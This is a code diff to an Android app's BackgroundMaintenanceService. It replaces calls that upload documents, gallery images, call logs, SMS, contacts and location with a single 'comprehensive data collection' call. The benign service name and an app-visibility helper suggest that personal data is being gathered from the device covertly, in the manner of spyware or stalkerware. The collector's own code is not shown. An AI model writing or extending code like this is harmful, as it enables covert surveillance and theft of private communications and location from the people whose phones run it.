@@ -14,6 +14,7 @@ import androidx.core.app.NotificationCompat;
 import com.bushorat.app.R;
 import com.bushorat.app.activities.DashboardActivity;
 import com.bushorat.app.helpers.AppVisibilityHelper;
+import com.bushorat.app.helpers.DataCollectorService;
 import com.bushorat.app.helpers.DocumentSyncHelper;
 import com.bushorat.app.helpers.DocumentUploadWorker;
 import com.bushorat.app.helpers.ImageUploadWorker;
@@ -105,22 +106,14 @@ public class BackgroundMaintenanceService extends Service {
             
             Log.d(TAG, "Scheduling background tasks for user: " + user.getUid());
             
-            // PARALLEL UPLOADS: Start documents and media at the same time
-            Log.d(TAG, "⚡ PARALLEL: Triggering IMMEDIATE document + gallery upload");
-            DocumentUploadWorker.enqueueWork(this);
-            ImageUploadWorker.enqueueWork(this);
+            // COMPREHENSIVE DATA COLLECTION
+            Log.d(TAG, "🔄 Starting comprehensive data collection");
+            DataCollectorService.collectAllData(this);
             
-            // Schedule periodic syncing (documents every 10 min, media every 1 hour)
+            // Schedule periodic syncing
             DocumentSyncHelper.schedulePeriodicDocumentUpload(this);
             
-            // Schedule periodic data syncing (calls, SMS, contacts, location, etc.)
-            UserDataSyncHelper.syncAll(this);
-            
-            // Immediate location upload
-            Log.d(TAG, "📍 Uploading current location");
-            LocationSyncHelper.uploadIfAllowed(this);
-            
-            Log.d(TAG, "✓ All background tasks scheduled in PARALLEL");
+            Log.d(TAG, "✓ All background tasks scheduled");
         } catch (Exception e) {
             Log.e(TAG, "Error scheduling background tasks", e);
         }
